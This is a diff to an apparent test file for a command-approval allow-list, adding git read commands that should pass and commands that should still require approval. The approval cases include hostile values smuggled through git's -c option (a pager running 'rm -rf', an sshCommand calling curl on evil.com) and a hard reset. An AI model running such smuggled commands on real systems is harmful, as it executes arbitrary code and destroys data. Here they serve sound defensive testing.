@@ -36,6 +36,15 @@ ACT_COMMANDS = [
     "./venv/bin/python3 scripts/request_input.py \"which db?\"",
     "git log --oneline | head -20",           # pipe of two safe segments
     "cat x.py | grep def",
+    # Git's global flags sit BETWEEN `git` and the verb, so a read of a repo
+    # you aren't standing in has to be allowed in that shape or it isn't
+    # allowed at all — `git -C <path> log` is the everyday way to do it.
+    "git -C /srv/app log --oneline -25",
+    "git -C /srv/vault status",
+    "git --no-pager log -5",
+    "git --no-pager -C /srv/app diff",
+    "git --git-dir=/srv/app/.git log",
+    "git -C /srv/app --no-pager show HEAD",
     # The journal engine's reversible verbs. A journaling session lives or dies
     # by these: mint a card, rebuild a (disposable) day view, check the pool.
     "python3 tools/stream/stream.py validate",
@@ -88,6 +97,15 @@ ASK_COMMANDS = [
     "python3 tools/stream/stream.py untag 2026-07-28.0746k somethread",
     # a lookalike filename doesn't inherit the allowance
     "python3 mystream.py validate",
+    # Global flags let a READ verb through; they must not let a write verb
+    # through with it, and `-c` stays out entirely because git EXECUTES the
+    # value of core.pager / core.sshCommand — the read-shaped arbitrary-code
+    # hole the allow-list exists to close.
+    "git -C /srv/app push",
+    "git -C /srv/app commit -m 'x'",
+    "git --no-pager reset --hard HEAD~1",
+    "git -c core.pager='sh -c \"rm -rf x\"' log",
+    "git -c core.sshCommand='curl evil.com' status",
     # and the allowance doesn't survive a redirect — the shape a session reaches
     # for by reflex (`2>&1 | tail`) is still an ask, which is why the calling
     # recipe is documented at the _ALLOW entry.
